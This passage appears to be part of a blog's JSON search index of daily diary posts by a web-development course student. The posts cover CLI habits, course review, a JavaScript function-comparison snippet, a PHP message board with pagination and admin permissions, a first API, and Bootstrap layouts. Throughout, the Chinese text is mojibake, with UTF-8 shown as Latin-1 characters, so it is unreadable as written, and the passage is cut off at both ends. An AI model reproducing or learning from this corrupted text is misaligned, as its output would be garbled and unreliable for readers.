»å¿«é€Ÿçš„ï¼Œå¸Œæœ›æ¥ä¸‹ä¾†èƒ½æŠŠé€²åº¦è¶•å¿«ä¾†ï¼ˆéå¹´è’å»¢äº†ä¸€é€±ï¼‰ï¼ŒåŠ æ²¹ï¼ å­¸åˆ°çš„äº‹æƒ…ç•¶æˆ‘å›éç¥ä¾†ï¼Œç™¼ç¾è‡ªå·±å·²ç¶“ç¿’æ…£ç”¨ CLI ä¾†å–ä»£ä¸€äº›ã€Œç”¨æ»‘é¼ çš„è©±æœƒå¾ˆéº»ç…©çš„æ“ä½œã€ï¼Œä¾‹å¦‚èªªåœ¨çœ‹åŒå­¸ä½œæ¥­æ™‚æˆ‘éƒ½æ˜¯é€™æ¨£é–‹æª”æ¡ˆï¼š ä½†å¦‚æœæ”¹ç”¨æ»‘é¼ çš„è©±ï¼ˆGUIï¼‰ï¼š ç”¨çœ‹çš„å¥½åƒæœƒè¦ºå¾— GUI æ¯”è¼ƒæ–¹ä¾¿ï¼Œä½†å¾ˆæ‡¶å¾—ç¢°æ»‘é¼ çš„æ™‚å€™å°±æœƒè¦ºå¾— CLI çœŸçš„æ–¹ä¾¿å¤šäº†ï¼Œå¾ˆæ…¶å¹¸æœ‰å­¸æœƒ CLIã€‚ åœ¨æª¢è¨ä½œæ¥­çš„ç°¡ç­”é¡Œæ™‚ï¼Œæœ‰å»çœ‹åˆ¥äººæ˜¯æ€éº¼å¯«çš„ã€‚æ¯å€‹äººè…¦è¢‹ç“œæƒ³çš„éƒ½ä¸åŒï¼Œé€™ä¸€é»é‚„è »æœ‰è¶£çš„ï¼ŒåŒæ¨£çš„æ¦‚å¿µæ¯å€‹äººéƒ½æœ‰ä¸åŒçš„æ•˜è¿°æ–¹å¼ï¼Œé›–ç„¶çœ‹ä¾†çœ‹å»é‚„æ˜¯è¦ºå¾—è‡ªå·±å¯«çš„æœ€å¥½æ‡‚ï¼Œä½†é‚„æ˜¯èƒ½å¾å…¶ä»–äººèº«ä¸Šå­¸åˆ°ä¸€äº›è‡ªå·±æ²’æ³¨æ„åˆ°çš„æ¦‚å¿µï¼Œæˆ–è€…æ˜¯ä¸€äº›è »æœ‰å‰µæ„çš„æƒ³æ³•ã€‚ ç¸½ä¹‹ï¼Œæˆ‘è¦ºå¾—ã€Œçœ‹åŒå­¸ä½œæ¥­ã€é‚„æ˜¯è »å€¼å¾—å»åšçš„ä¸€ä»¶äº‹ï¼Œå„˜ç®¡é€™æ¯”è¼ƒèŠ±æ™‚é–“ã€‚ é¡Œå¤–è©± æ’éå»å°±æ˜¯ä½ çš„ã€‚ å¥½å¥½å¥½ï¼ŒåŠ æ²¹ï½ï¼ˆï¼Ÿï¼Ÿï¼Ÿ è¨±é¡˜æ± æ˜å¤©é€²åˆ° wee10ï¼Œé›–ç„¶èªªæ˜¯è¤‡ç¿’é€±ï¼Œä½†æˆ‘é‚„æ˜¯æƒ³è¶•é€²åº¦ QQ å¸Œæœ›æ˜å¤©èƒ½å¿«é€Ÿè¤‡ç¿’ï¼Œç„¶å¾Œé–‹å§‹è·‘ week11 çš„é€²åº¦ï½","link":"/2022/02/11/mentor-program-day59/"},{"title":"mentor-program-day60","text":"çœŸæ­£çš„å…©å€‹æœˆï½ é€²åº¦å› ç‚º week14 å°±è¦éƒ¨å±¬ç¶²ç«™äº†ï¼Œä½†èª²ç¶±è£¡æ²’æœ‰çœ‹åˆ°ç›¸é—œè³‡æºï¼Œæ‰€ä»¥ä»Šå¤©èŠ±äº†ä¸€äº›é–“çœ‹äº† [MTR01] çš„ Lesson8ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾å‡ºä¸€äº›ç·šç´¢ï¼Œé‚„å¥½è£¡é¢æœ‰æä¾›è »å¤šè³‡è¨Šçš„ï¼Œå¸Œæœ›ä¹‹å¾Œä¸æœƒç¢°åˆ°å¤ªå¤šå›°é›£ã€‚ å¦å¤–ä¹ŸæŠŠ week10 çš„å°éŠæˆ²éƒ½ç ´é—œäº†ï¼Œå¯«äº†ä¸€ç¯‡ç°¡çŸ­çš„ç´€éŒ„ï¼šR30 ç•°ä¸–ç•Œç¶²ç«™æŒ‘æˆ°ï¼ç°¡çŸ­ç´€éŒ„ æœ‰å¹¾é—œçœŸçš„è¦å¤šæƒ³ä¸€ä¸‹æ‰æœ‰è¾¦æ³•è§£å‡ºä¾†ï¼ŒèŠ±äº†è »å¤šæ™‚é–“ï¼Œä½†ç ´é—œå¾Œè »æœ‰æˆå°±æ„Ÿçš„ã€‚ç¸½é«”ä¾†èªªé€™æ˜¯ä¸€å€‹å€¼å¾—ä¸€ç©çš„å¥½éŠæˆ²ã€‚ å­¸åˆ°çš„äº‹æƒ… å¯ä»¥ç”¨ ESC ä¾†é˜»æ­¢ JavaScript è‡ªå‹•è½‰å€ é€™å€‹æˆ‘çœŸçš„ä¸çŸ¥é“ï¼Œå¤ªï½ï½ï½é©šäººäº†ã€‚ å°éŠæˆ² å¹¾ A å¹¾ B çŒœæ•¸å­— ä¸çŸ¥é“æˆ‘çš„ç«¥å¹´ç™¼ç”Ÿäº†ä»€éº¼ï¼Œé€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡ç©é€™å€‹éŠæˆ²ã€‚ å…¶æ¬¡çš„è©±æ˜¯è¤‡ç¿’ week5 ~ week9 çš„å…§å®¹ï¼Œå¤§è‡´ä¸Šæ²’ä»€éº¼å•é¡Œï¼Œç¹¼çºŒåŠ æ²¹ï¼ é¡Œå¤–è©±åˆåˆ°äº†å¿«æ¨‚çš„å‘¨æœ«ï¼Œå‘¨æœ«æ˜¯è·Ÿå¥³æœ‹å‹ä¸€èµ·çœ‹é›»å½±çš„å¿«æ¨‚æ™‚å…‰ (Â´,,â€¢Ï‰â€¢,,)â™¡ è¨±é¡˜æ± æ˜å¤©æ‡‰è©²æœƒå»çœ‹ [MTR101] ä¾†è¤‡ç¿’å‰å¹¾å‘¨çš„å…§å®¹ï¼Œé€²åº¦é †åˆ©çš„è©±æœƒæŠŠ week10 å¿ƒå¾—å¯«å®Œï¼Œæ¥è‘—é€²å…¥ week11 çš„å…§å®¹ã€‚","link":"/2022/02/12/mentor-program-day60/"},{"title":"mentor-program-day61","text":"è¤‡ç¿’çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©çœ‹ [MTR101] ä¾†è¤‡ç¿’ï¼Œä¸»è¦è¤‡ç¿’äº† gitã€unit test é‚„æœ‰ç¨‹å¼åŸºç¤ã€‚ä¸€å€‹æ¯”æˆ‘é æœŸä¸­èŠ±æ™‚é–“çš„æ™‚å…‰ï¼Œä½†ç›¸ä¿¡è¤‡ç¿’é‚„æ˜¯æœ‰å¹«åŠ©çš„ï¼Œæ‰€ä»¥å¤šåŠ æ²¹å§ï¼ æ¥è‘—ä¹Ÿè¶è‘—è¤‡ç¿’åšäº†ä¸€é¡Œ week2 çš„ è¶…ç´šè¶…ç´šæŒ‘æˆ°é¡Œï¼ˆä¸çŸ¥é“æœ‰æ²’æœ‰è¶…ç´šè¶…ç´šè¶…ç´šæŒ‘æˆ°é¡Œï¼‰ï¼šå¤§æ•¸ç›¸åŠ èˆ‡ç›¸ä¹˜ã€‚èŠ±äº†ä¸å°‘æ™‚é–“ï¼Œä½†åšå‡ºä¾†çœŸçš„æ»¿æ»¿æˆå°±æ„Ÿ d(`ï½¥âˆ€ï½¥)b å­¸åˆ°çš„äº‹æƒ… å–„ç”¨ branch ä»Šå¤©é ˜æ‚Ÿåˆ°ä¸‹æ¬¡è¦æ”¹æ±è¥¿çš„è©±ä¸è¦å†ç”¨è¤‡è£½å¤§æ³•ï¼Œè€Œæ˜¯ç›´æ¥é–‹åˆ†æ”¯ï¼Œæˆæœ¬ä½åˆå¿«é€Ÿæ–¹ä¾¿ï¼Œä¸é–‹å—ï¼Ÿ è®Šæ•¸çš„åº•å±¤é‹ä½œ å†æ¬¡è¤‡ç¿’äº†é€™å€‹å¾ˆé‡è¦çš„è§€å¿µï¼Œä¹‹å‰åš unit test æ™‚æ²’æœ‰æ¸¬åˆ°é™£åˆ— or ç‰©ä»¶çš„æƒ…å½¢ï¼Œå‰›å¥½æ²’è¸©åˆ°é€™å€‹é›·ï¼Œå¦‚æœç¾åœ¨æ²’è¤‡ç¿’çš„è©±å¤§æ¦‚æœƒè¢«é›·çš„ä¸è¦ä¸è¦çš„ (Â´âˆ©Ï‰âˆ©ï½€) é‚„æœ‰ function ä¹Ÿæ˜¯å­˜è¨˜æ†¶é«”ä½å€ï¼Œæ‰€ä»¥ï¼š 1234const a = () =&gt; 1;const b = () =&gt; 1;console.log(a === b) // falseconsole.log(a() === b()) // true å‚™è¨»ï¼šä¸€å®šè¦ææ¸…æ¥šï¼Œä¸Šé¢æ˜¯æ¯”ã€Œè®Šæ•¸å„²å­˜çš„å€¼ã€ä¸‹é¢æ˜¯æ¯”ã€Œå›å‚³å€¼ã€ã€‚ æ‡‰è©²æ˜¯å› ç‚ºå¾ˆå°‘äººæœƒæ‹¿ function å»æ¯”å°ï¼Œæ‰€ä»¥ä»Šå¤©ä¸Šèª²æ‰æƒ³åˆ°ã€Œå“¦ï¼å°è€¶ï¼Œfunction ç¢ºå¯¦ä¹Ÿæ˜¯é€™æ¨£ã€ï¼Œä¸€ç¨®å¤§å®¶éƒ½çŸ¥é“ä½†æ²’äººæ³¨æ„éçš„å†·çŸ¥è­˜ã€‚ é¡Œå¤–è©±æ˜å¤©é¬¼æ»…å®Œçµï¼Œè€¶ã€‚ è¨±é¡˜æ± å¸Œæœ›æ˜å¤©æŠŠè¤‡ç¿’åšå®Œï¼Œæ¥è‘—ç¹¼çºŒè¶•é€²åº¦ã€‚","link":"/2022/02/13/mentor-program-day61/"},{"title":"mentor-program-day62","text":"è¦é€²åˆ°ä¸‹ä¸€é€±äº†ã€‚ é€²åº¦ä»Šå¤©æŠŠ [MTR01] çœ‹åˆ°æƒ³çœ‹çš„åœ°æ–¹äº†ï¼Œä¹Ÿå¯«äº† week10 çš„è¤‡ç¿’å¿ƒå¾—ï¼Œæœ€å¾ŒæŠŠè©²åšçš„äº‹æƒ…éƒ½åšå®Œäº†ã€‚ å¯«å®Œä½œæ¥­å¾Œçœ‹äº†å¹¾ä½åŒå­¸çš„å¿ƒå¾—ï¼Œæœ‰å¾åˆ¥äººèº«ä¸Šå­¸åˆ°ä¸€äº›è »æœ‰è¶£çš„æ±è¥¿ï¼Œä¹Ÿçœ‹åˆ°æ¯å€‹äººåœ¨å­¸ç¿’ä¸­ç¢°åˆ°äº†å“ªäº›éšœç¤™ï¼Œä»¥åŠå¦‚ä½•è§£æ±ºèˆ‡é¢å°çš„ã€‚ å­¸åˆ°çš„äº‹æƒ…CSS å¤šè¡Œæ–‡å­—é¡¯ç¤º â€¦ çš„æ•ˆæœï¼Œé€™ä¸€æ‹›å°±æ˜¯å¾åˆ¥äººçš„å¿ƒå¾—è£¡å­¸ä¾†çš„ï¼Œä¸€å€‹è »æœ‰è¶£çš„ä½œæ³•ã€‚ åŒæ¨£çš„æ•™å­¸æ–¹å¼ï¼Œæ¯å€‹äººè¦ºå¾—å›°é›£çš„åœ°æ–¹éƒ½ä¸åŒï¼Œä¾‹å¦‚æœ‰åŒå­¸è¦ºå¾—åˆ‡ç‰ˆå¾ˆé›£ï¼Œèªç‚º CSS çš„é‚è¼¯å„ç¨®è¤‡é›œï¼Œä½†æ˜¯å»èƒ½è§£å‡º è²ªå©ªçš„å°å· Part2ï¼Œé€™é¡Œæˆ‘å…‰ google é—œéµå­—å°±æ„Ÿåˆ°é ­ç—›çš„æ±è¥¿ï¼›ä¹Ÿæœ‰åŒå­¸å¾ˆæœ‰è¶£ï¼Œä»–çš„æƒ³æ³•æ˜¯ UI è¶Šæ¼‚äº®ä»–å°±è¶Šæœ‰å‹•åŠ›å¯« JSï¼Œä½† UI å¾ˆå·®çš„è©±å°±æ²’æœ‰å‹•åŠ›ï¼›ä¹Ÿæœ‰åŒå­¸ç”šè‡³å› ç‚ºå­æƒ¡ CSS è€Œè·‘å»å­¸é è™•ç†å™¨ã€‚ç¸½ä¹‹ä»€éº¼æ¨£çš„äººéƒ½æœ‰ï¼Œæ¯å€‹äººéƒ½æœ‰è‡ªå·±å–œæ­¡èˆ‡è¨å­çš„æ±è¥¿ã€‚ å¦å¤–ä¹Ÿé«”æœƒåˆ°è¡¨é”èƒ½åŠ›å¥½èˆ‡ä¸å¥½çš„å€åˆ¥ï¼Œåƒæˆ‘è‡ªå·±è·Ÿå…¶ä»–åŒå­¸å°±æ˜¯å±¬æ–¼ä¸å¥½çš„é‚£å€‹ï¼Œä½†é‚„æ˜¯èƒ½çœ‹å‡ºä»–å€‘å°±è·Ÿè‡ªå·±ä¸€æ¨£ï¼Œç›¡åŠ›ç”¨è‡ªå·±çŸ¥é“çš„è©å½™ä¾†é—¡è¿°ä¸€é …çŸ¥è­˜ã€‚å„˜ç®¡æˆ‘æ¯å¤©éƒ½å¯«æ—¥è¨˜èˆ‡ç­†è¨˜ï¼Œæ–‡ç­†é‚„æ˜¯å·®å¼·äººæ„ï¼Œä¸éç›¸ä¿¡é‚„æ˜¯æœ‰æ…¢æ…¢åœ°åœ¨è®Šå¥½å§ï¼Œå¸Œæœ›æˆ‘æœ‰å¤©ä¹Ÿèƒ½å­¸æœƒèªªè©±çš„è—è¡“ï¼Œä»¥åŠæ¸…æ¥šè¡¨é”çš„èƒ½åŠ›ã€‚ é¡Œå¤–è©±ä¸ï¼Œé¬¼æ»…å®Œçµäº† QQï¼Œåªå¥½ç¹¼çºŒæœŸå¾…ä¸‹ä¸€å­£ã€‚ è¨±é¡˜æ± æ˜å¤©è¦é€²åˆ° week11ï¼Œé‚„æ˜¯è€è©±ä¸€å¥ï¼Œå¸Œæœ›é€²åº¦é †åˆ©ï½","link":"/2022/02/14/mentor-program-day62/"},{"title":"mentor-program-day63","text":"ç¹¼çºŒåŠªåŠ›å››å€‹æœˆã€‚ é€²åº¦ä»Šå¤©å»¶çºŒ [BE101] çš„å‰©é¤˜å…§å®¹ï¼Œç•™è¨€æ¿é€™å€‹å°ˆæ¡ˆä¹Ÿçµ‚æ–¼è¦ç•«ä¸‹ä¸€å€‹çµå°¾äº†ã€‚ç¹¼çºŒæœŸå¾…ä¹‹å¾Œçš„ç¶²ç«™éƒ¨å±¬ã€‚ å­¸åˆ°çš„äº‹æƒ…çµ‚æ–¼æŠŠç•™è¨€æ¿åšæˆä¸€å€‹æ¯”è¼ƒå®Œæ•´çš„å°ˆæ¡ˆäº†ï¼š ç¾åœ¨å¤šäº†ç·¨è¼¯ã€åˆªé™¤å’Œåˆ†é çš„åŠŸèƒ½ï¼Œåœ¨å­¸å®Œå¾Œä¹Ÿäº†è§£åˆ°ç‚ºä»€éº¼é€™äº›åŠŸèƒ½è¦ç•™åˆ°æœ€å¾Œæ‰æ•™ã€‚é›–ç„¶ MySQL æ˜¯å€‹é—œè¯å¼è³‡æ–™åº«ï¼Œä½†åœ¨å‰é¢å¹¾é€±éƒ½æ²’æœ‰å¯¦éš›ç™¼æ®ã€Œé—œè¯ã€çš„åŠŸèƒ½ï¼Œå¾ˆå¤šæ±è¥¿éƒ½æ˜¯ç¨ç«‹å¯«æ­»çš„ã€‚ ã€Œè³‡æ–™åº«æ­£è¦åŒ–ã€å°±æ˜¯çœŸæ­£åˆ©ç”¨é—œè¯çš„ç‰¹æ€§ä¾†æŠŠæ¯å€‹ table çµ¦åšé—œè¯ã€‚ä¸€é–‹å§‹ä¸æ•™é€™å€‹æ‡‰è©²æ˜¯å› ç‚ºæ¯”è¼ƒè¤‡é›œï¼Œè€Œä¸” Join èªæ³•ç›¸è¼ƒæ–¼ä¸€èˆ¬çš„ SQL åˆæ›´è¤‡é›œä¸€äº›ï¼Œä¹Ÿè¨±æ˜¯åŸºæ–¼é€™å€‹ç†ç”±æ‰ç•™åˆ°æœ€å¾Œæ•™å§ï¼Œæˆ‘çŒœçš„ã€‚ åˆ†é åŠŸèƒ½æ˜¯å€‹è »æœ‰è¶£çš„æ±è¥¿ï¼Œåƒåˆ†é çš„å¯¦ä½œæ–¹å¼å…¶å¯¦æœ‰åˆ†æˆå…©ç¨®ï¼Œä¸€ç¨®æ˜¯ offsetï¼Œä¸€ç¨®æ˜¯ cursorã€‚é€™å…©ç¨®åœ¨æˆ‘ä¸² Twitch API çš„æ™‚å€™éƒ½ç”¨éï¼Œç•¶æ™‚è¦ºå¾— offset ç›´è¦ºå¤šäº†ï¼Œcursor æ˜¯ä»€éº¼åäººé¡çš„ä½œæ³•ï¼Ÿä½†å¾Œä¾†çœ‹å®Œæ–‡ç« å¾Œæ‰äº†è§£åŸä¾† cursor çš„å¥½è™•é‚„è »å¤šçš„ï¼Œæ€ªä¸å¾— Twitch æ–°ç‰ˆ API è¦ç”¨ cursor ä¾†å–ä»£ offsetã€‚ä½†å°æ–¼åˆå­¸è€…ä¾†èªªæˆ‘é‚„æ˜¯èªç‚º offset çµ•å°æ¯”è¼ƒç›´è§€å¥½æ‡‚ã€‚ ä¹Ÿå› ç‚ºä¹‹å‰ä¸² Twitch çš„æ™‚å€™å°±ç”¨éåˆ†é åŠŸèƒ½äº†ï¼Œæ‰€ä»¥ä»Šå¤©åœ¨å¯¦ä½œæ™‚æ²’ç¢°åˆ°å¤ªå¤§å›°é›£ã€‚æœ‰è¶£çš„åœ°æ–¹æ˜¯åŸä¾†åˆ†é åŠŸèƒ½æ˜¯ç”¨ SQL çš„æ–¹å¼ä¾†å¯¦ç¾çš„é€™é»å¾ˆæœ‰æ„æ€ï¼Œä¹Ÿå¾é€™æ¬¡å¯¦ä½œæ›´ç†è§£å‰å¾Œç«¯ä¹‹é–“çš„è„ˆçµ¡ã€‚ é¡Œå¤–è©±å¸Œæœ›æˆ‘èƒ½åœ¨æ¥ä¸‹ä¾†çš„æ™‚é–“è®Šå¾—æ›´å¼·ã€‚ è¨±é¡˜æ± æ˜å¤©æŠŠ [BE101] å‰©ä¸‹çš„éƒ¨åˆ†ä½œå®Œå°±èƒ½é–‹å§‹åšä½œæ¥­äº†ï¼ŒåŠ æ²¹ï¼","link":"/2022/02/15/mentor-program-day63/"},{"title":"mentor-program-day64","text":"æ…¶ç¥äººç”Ÿç¬¬ä¸€æ”¯ APIï½ é€²åº¦ä»Šå¤©æŠŠç•™è¨€æ¿åšæœ€å¾Œçš„æ¬Šé™èª¿æ•´ï¼Œæ¥è‘—å°±å¯¦ä½œ API äº†ã€‚ ç°¡å–®ç§€ä¸€ä¸‹æˆæœï¼š é›–ç„¶åªæ˜¯æ‹¿åŸæœ¬çš„æ±è¥¿ä¿®ä¿®å‰ªå‰ªï¼Œä½†é‚„æ˜¯è¦ºå¾—å¾ˆç¥å¥‡ã€‚ å¦å¤–é™„ä¸€ä¸‹ä»Šå¤©ä½œçš„ç­†è¨˜ï¼š ç”¨ PHP åšä¸€å€‹æœ€åŸºæœ¬çš„ API å¾ PHP å­¸ç¿’æ¬Šé™ç®¡ç†çš„é‡è¦æ€§ ç”¨ PHP å¯¦ä½œåˆ†é åŠŸèƒ½ å­¸åˆ°çš„äº‹æƒ…[BE101] é€™é–€èª²å¯ä»¥èªªæ˜¯æˆ‘ç›®å‰è¦ºå¾—æœ€æœ‰è¶£çš„ä¸€å ‚ï¼Œå¾ˆå¤šæˆ‘ä»¥å‰è¦ºå¾—è¤‡é›œçš„æ±è¥¿éƒ½åœ¨é€™é–€èª²ææ‡‚äº†ã€‚ç‰¹åˆ¥æ˜¯è³‡æ–™åº«çš„éƒ¨åˆ†ï¼Œå¦‚æœæ²’æœ‰å¯¦éš›å»ç©éçš„è©±ï¼Œæˆ‘å¯èƒ½è‡³ä»Šé‚„æ˜¯ä»¥ç‚ºåˆ†é åŠŸèƒ½æ˜¯ç”¨ä»€éº¼é»‘é­”æ³•åšå‡ºä¾†çš„ï¼ŒAPI æ˜¯ç”¨äº†ä»€éº¼å¾ˆè¤‡é›œçš„æ¦‚å¿µåšå‡ºä¾†çš„ã€‚ ç¸½ä¹‹ï¼Œé€™é–€èª²çš„æ”¶ç©«é æ¯”æˆ‘é æœŸä¾†å¾—å¤šï¼Œä¹ŸåŸ¹é¤Šäº†å¾ˆå¤šè³‡å®‰çš„æ¦‚å¿µï¼ˆä»¥å‰æ˜¯ 0ï¼‰ï¼ŒçœŸçš„å¾ˆä½©æœ huli çš„èª²ç¨‹å®‰æ’ï¼Œä¹Ÿé«”æœƒåˆ°ã€Œè„ˆçµ¡ã€å°å­¸ç¿’çš„é‡è¦æ€§ï¼Œåªè¦ææ¸…æ¥šè„ˆçµ¡ï¼Œå¾ˆå¤šæ±è¥¿å°±èƒ½èæœƒè²«é€šï¼Œé€™é»æ˜¯çœŸçš„ã€‚ é¡Œå¤–è©±æœ€è¿‘é–‹å§‹å°è‡ªå‹•åŒ–è…³æœ¬æœ‰èˆˆè¶£ï¼Œä¹Ÿå¯«äº†ä¸€äº›è§£æ±ºç”Ÿæ´»å•é¡Œçš„å°ç¨‹å¼ï¼Œä¸çŸ¥é“é€™ç®—ä¸ç®—å­¸ä»¥è‡´ç”¨ï¼Œç¸½ä¹‹å¾ˆé–‹å¿ƒï¼Œè‡ªå·±çµ‚æ–¼é–‹å§‹èƒ½åšå‡ºä¸€äº›æœ‰è¶£çš„ç©æ„å…’äº†ã€‚ è¨±é¡˜æ± æ˜å¤©æ‡‰è©²å°±èƒ½é–‹å§‹åšä½œæ¥­äº†å§ï¼Œé€™é€±ä½œæ¥­å°±æ¯”ä¸Šé€±å¤šäº†ï¼Œå¸Œæœ›èƒ½å¯«çš„é †åˆ©ã€‚","link":"/2022/02/16/mentor-program-day64/"},{"title":"mentor-program-day65","text":"é–‹å¿ƒçš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©é–‹å§‹åšä½œæ¥­ï¼ŒæŠŠç•™è¨€æ¿åŠ ä¸Šèº«åˆ†åŠŸèƒ½é‚„æœ‰ç®¡ç†æ¬Šé™ï¼š çœ‹èµ·ä¾†æ˜¯å€‹ç°¡å–®çš„åŠŸèƒ½ï¼Œå»èŠ±äº†æ¯”é æœŸä¹…çš„æ™‚é–“ä¾†å®Œæˆã€‚ä¹Ÿè¨±æ˜¯åœ¨è€ƒæ…®è³‡å®‰å•é¡Œæ™‚æƒ³äº†æ¯”è¼ƒå¤šï¼Œå¸Œæœ›è‡ªå·±æ²’æœ‰åšå‡ºæ¼æ´ç¶²ç«™ QQã€‚ ç›®å‰æœ‰è€ƒæ…®åˆ°çš„æ¼æ´ï¼š ä¸€èˆ¬ç”¨æˆ¶ã€è¨ªå®¢ä¸èƒ½é€²å…¥ç®¡ç†é é¢ï¼ˆç›´æ¥è¼¸å…¥ç¶²å€ä¹Ÿä¸è¡Œï¼‰ ä¸èƒ½é€éç¶²å€ç™¼å‡ºå½é€ çš„ request ä¾†æ›´æ”¹æ¬Šé™ å¸Œæœ›é€™æ¨£æœ‰åšåˆ°åŸºæœ¬çš„å®‰å…¨æ€§â€¦ å­¸åˆ°çš„äº‹æƒ…è¦è®“ä¸€å€‹ç¶²ç«™ä¸å­˜åœ¨æ¼æ´å¯¦åœ¨è¦éå¸¸ç´°å¿ƒï¼Œå¾ˆå¤šæ™‚å€™éƒ½æ˜¯è‡ªå·±ä»¥ç‚ºé€™æ¨£æ˜¯å®‰å…¨çš„ã€‚ä½†ä¸æ˜¯é€™æ¨£å­ï¼Œé€šå¸¸éƒ½æ˜¯æ²’æœ‰æƒ³åˆ°åˆ¥äººå¯ä»¥é€™æ¨£æ”»æ“Šã€‚ huli èªªçš„ä¸€å¥è©±å¾ˆæœ‰é“ç†ã€Œä¸€å€‹ç¶²ç«™åªè¦è¢«ç™¼ç¾ä¸€å€‹æ¼æ´ï¼Œå°±æœƒç ´å£å¤§é–‹ï¼›å¯æ˜¯è¦æŠŠä¸€å€‹ç¶²ç«™åšçš„å®‰å…¨ï¼Œå»è¦è€ƒæ…®æ‰€æœ‰å¯èƒ½è¢«æ”»æ“Šçš„æ–¹å¼ã€ï¼Œç•¶å¦è¦ä»˜å‡ºçš„å¿ƒåŠ›æ¯”ä¸€èˆ¬äººé‚„è¦å¤šå•Š ï½¡ï¾Ÿ(ï¾ŸÂ´Ï‰`ï¾Ÿ)ï¾Ÿï½¡ é¡Œå¤–è©±å¦‚æœæ™‚é–“èƒ½é‡ä¾†ï¼Œå¸Œæœ›è‡ªå·²æ›´æ—©é–‹å§‹å­¸ç¨‹å¼ã€‚ è¨±é¡˜æ± æ˜å¤©æ‡‰è©²èƒ½åšç¬¬äºŒå€‹ä½œæ¥­ï¼Œé †åˆ©çš„è©±å°±èƒ½æŠŠ week11 ç•«ä¸‹å¥é»ã€‚","link":"/2022/02/17/mentor-program-day65/"},{"title":"mentor-program-day66","text":"åˆ‡ç‰ˆç‰ˆæ—¥ã€‚ é€²åº¦ä»Šå¤©æŠŠç•™è¨€æ¿çš„ bug ä¿®å¥½å¾Œï¼Œå°±é–‹å§‹åšç¬¬äºŒä»½ä½œæ¥­ï¼Œç›®å‰æŠŠæœƒç”¨åˆ°çš„é é¢éƒ½åˆ‡å¥½äº†ï¼š åŸæœ¬æ‡‰è©²æ˜¯è¦æ‰‹åˆ»æ‰å°ï¼Œä¸éå¯¦åœ¨å¾ˆæƒ³æŠŠç™¾å¤§ä¼æ¥­éƒ½æ„›ç”¨çš„ã€ŒBootstrapã€å­¸èµ·ä¾†ï¼Œæ‰€ä»¥é€™ä¸€æ¬¡å°±ç›´æ¥ç”¨ Bootstrap ä¾†åšã€‚ å­¸åˆ°çš„äº‹æƒ…è¦ç”¨ä¸€å¥è©±ä¾†å½¢å®¹ Boostrap çš„è©±å°±æ˜¯ï¼š å¾ˆå¿«ã€‚ é›–ç„¶ç¢ºå¯¦æœƒåƒå¾ˆå¤šäººèªªçš„ç¶æ‰‹ç¶è…³ï¼Œæ”¹æ±è¥¿ä¸æ˜¯é‚£éº¼ç›´è§€ï¼Œä½†å¦‚æœä½ åªæ˜¯è¦ä¸€å€‹ã€Œçœ‹èµ·ä¾†é‚„ä¸éŒ¯ã€çš„ç‰ˆé¢ï¼ŒBootstrap ç„¡ç–‘æ˜¯å€‹å¥½é¸æ“‡ï¼ˆä¸éé‚„æ˜¯è¦æœƒåŸç”Ÿ CSS å°±æ˜¯äº†ï¼Œä¸ç„¶åˆ‡å‡ºä¾†çš„ç‰ˆæœƒæœ‰ä¸€è‚¡å¾ˆé‡çš„ BS å‘³ï¼‰ï¼Œæ˜¨å¤©åˆ‡å®Œæ¯å€‹ç‰ˆå¤§æ¦‚èŠ±äº† 3 ~ 4 å°æ™‚å§ã€‚ å„˜ç®¡ç”¨äº† Bootstrap å¾Œç¯€çœäº†ä¸å°‘æ™‚é–“ï¼Œä½†æˆ‘è¦ºå¾—é‡é»é‚„æ˜¯è¦çŸ¥é“æ€éº¼å»å®¢è£½åŒ–ï¼Œç†è§£å®ƒçš„çµæ§‹ã€‚æ‰€ä»¥ä½ é‚„æ˜¯è¦ç†è§£åº•å±¤çš„ CSS é‚è¼¯ï¼Œè¦ä¸ç„¶çœŸçš„åªèƒ½ä¸€è·¯ Copy and Paste åˆ°åº•ï¼Œæˆ‘æƒ³é€™æ¨£æ²’ä»€éº¼æ„ç¾©ï¼Œä¹Ÿä¸æ˜¯å¤§éƒ¨åˆ†äººçš„éœ€æ±‚ã€‚ å¸Œæœ›æ¥ä¸‹ä¾†èƒ½æŠŠ Bootstrap å¼„ç†Ÿï¼Œé™¤äº†åŠ å¿«åˆ‡ç‰ˆé€Ÿåº¦ä¹‹å¤–ï¼Œä¹Ÿå¸Œæœ›èƒ½æå‡å®¢è£½åŒ–çš„èƒ½åŠ›ï¼Œè®“æ¡†æ¶ä¸å†åªæ˜¯æ¡†æ¶ã€‚ é¡Œå¤–è©±æ¼¸æ¼¸æŠŠä»¥å‰çš„å‘ä¸€æ­¥ä¸€æ­¥å¡«å®Œã€‚ è¨±é¡˜æ± æ˜å¤©ç¹¼çºŒåšä½œæ¥­äºŒï¼Œé–‹ç™¼çœŸæ­£çš„åŠŸèƒ½ï¼Œå¸Œæœ›èƒ½ä¸€å¤©å°±æå®šã€‚","link":"/2022/02/18/mentor-program-day66/"},{"title":"mentor-program-day67","text":"Keep goingã€‚ é€²åº¦ä»Šå¤©æŠŠéƒ¨è½æ ¼çš„ä¸»è¦åŠŸèƒ½çµ¦åšå®Œäº†ï¼š ç™»å…¥æ©Ÿåˆ¶ å–®ç¯‡æ–‡ç« é–±è¦½ æ–°å¢ã€åˆªé™¤æ–‡ç«  æ–°å¢ã€åˆªé™¤åˆ†é¡ åˆ†é åŠŸèƒ½ æ…¢æ…¢ç†è§£ç‚ºä»€éº¼è¦ç”¨ MVC é€™å€‹æ±è¥¿äº†ï¼Œç•¶æ”¹ä¸€å€‹åœ°æ–¹å°±è¦æ”¹ä¸€å¤§å †é é¢çš„æ™‚å€™çœŸçš„è »éº»ç…©çš„ã€‚ å­¸åˆ°çš„äº‹æƒ…é›–ç„¶ PHP å¯«èµ·ä¾†å¾ˆç›´è¦ºï¼Œä½†ç•¶åŠŸèƒ½å¢åŠ æ™‚å°±æœƒè®Šå¾—å¾ˆè¤‡é›œã€‚å…‰æ˜¯å¯¦ä½œä¸Šé¢çš„åŠŸèƒ½å°±å·²ç¶“é–‹äº†21 å€‹ PHP æª”ï¼Œå¦‚æœçœ¼ç›ä¸å¤ åˆ©çš„è©±å¾ˆå¸¸æœƒææ··å“ªå€‹æª”æ¡ˆåœ¨åšä»€éº¼ï¼Œæ˜¯ä»¶è »å›°æ“¾çš„äº‹æƒ…ã€‚ å­¸æœƒèˆ‡é›œäº‚çš„ code ç›¸è™• æˆ‘æƒ³èº«ç‚ºå·¥ç¨‹å¸«å¿…é 